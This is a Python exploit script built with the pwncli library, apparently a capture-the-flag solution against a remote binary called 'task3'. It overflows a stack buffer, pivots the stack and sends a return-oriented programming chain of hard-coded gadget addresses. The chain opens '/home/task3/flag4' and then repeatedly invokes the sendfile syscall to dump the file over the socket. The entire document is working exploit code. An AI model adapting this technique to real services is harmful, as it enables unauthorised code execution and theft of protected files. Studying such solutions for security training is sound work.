#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

ru(b"token")
sl(input("YOUR TOKEN: ").encode())
ru(b"Challenge")
ru(b":")
sl(i2b(3))

syscall_ret = 0x0000000000425e04
pop_rdi_ret = 0x00000000004018c2
pop_rsi_ret = 0x0000000000402828
pop_rdx_ret = 0x00000000004017cf
pop_rax_ret = 0x00000000004583c7
str_flag    = next(elf.search(b"/home/task3/flag4\x00"))
lg("str_flag")
buf_addr    = 0x4df000+0x800

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8+0x10 - 8)
payload += p64(buf_addr)

payload += p64(pop_rdx_ret) + p64(0xdeadbeef)
payload += p64(pop_rsi_ret) + p64(buf_addr-0x30)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(0x401e28)

s(payload)

import time
time.sleep(1)

payload = b"a"*0x30 + p64(buf_addr-0x30)
payload += p64(pop_rdi_ret) + p64(str_flag)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(2)
payload += p64(syscall_ret)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_ret) + p64(3)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(0x28)
payload += p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
s(payload)

ia()
